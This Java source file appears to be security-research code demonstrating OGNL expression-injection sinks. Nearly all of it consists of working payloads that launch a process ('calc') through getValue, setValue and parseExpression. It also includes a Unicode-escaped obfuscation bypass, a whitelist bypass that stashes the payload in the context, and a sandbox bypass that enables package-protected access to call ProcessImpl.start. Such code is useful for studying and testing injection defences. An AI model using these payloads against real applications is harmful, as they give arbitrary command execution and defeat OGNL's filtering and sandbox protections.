package com.pinger.javasec.ssti.ognl;

import ognl.Ognl;
import ognl.OgnlContext;

import java.util.HashMap;

/**
 * @author : p1n93r
 * @date : 2021/8/12 19:24
 * 测试Ognl SSTI的常见sink
 */
public class AttackOgnl {


    /**
     * Ognl setValue() SSTI
     */
    public static void sinkOne()throws Exception{
        String expression="((new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start())(1)";
        OgnlContext context = new OgnlContext();
        context.put("name","test");
        Ognl.setValue(expression,context,"");
    }

    /**
     * Ognl getValue() SSTI
     */
    public static void sinkTwo()throws Exception{
        String expression="(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()";
        OgnlContext context = new OgnlContext();
        Ognl.getValue(expression,context,"");
    }

    /**
     * Ognl.parseExpression() --> Ognl.getValue()/Ognl.setValue()
     */
    public static void sinkThree()throws Exception{
        String expression="((new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start())(glassy)(asd)";
        OgnlContext context = new OgnlContext();
        Object o = Ognl.parseExpression(expression);
        Ognl.setValue(o,context,"");
    }

    /**
     * Unicode Bypass
     */
    public static void sinkFour()throws Exception{
        String expression="\\u0040\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0040\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u0029";
        OgnlContext context = new OgnlContext();
        Object value = Ognl.getValue(expression, context, "");
        System.out.println(value);
    }

    /**
     * Bypass Whitelist Check
     */
    public static void sinkFive()throws Exception{
        // 绕过白名单检查，先讲恶意的Ognl表达式放入Ognl的上下文中
        String preExpression="(@java.lang.Runtime@getRuntime().exec('calc'))(1)";
        OgnlContext context = new OgnlContext();
        context.put("key",preExpression);
        String attackStr="(key)(1)";
        Ognl.setValue(attackStr,context,"");
    }

    /**
     * Bypass OGNL sandbox
     */
    public static void bypassSandBox()throws Exception{
        System.setProperty("ognl.security.manager","true");
        OgnlContext context = new OgnlContext();
        HashMap<String, Object> rootMap = new HashMap<>(1);
        rootMap.put("test","@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.setAllowPackageProtectedAccess(true),#cmd=new String[]{'calc'},@java.lang.ProcessImpl@start(#cmd,null,null,null,false)");
        context.setRoot(rootMap);
        String express = "(test)('fuckOgnl')";
        Ognl.getValue(express,context, context.getRoot());
    }



    public static void main(String[] args)throws Exception {
        sinkFour();
    }


}
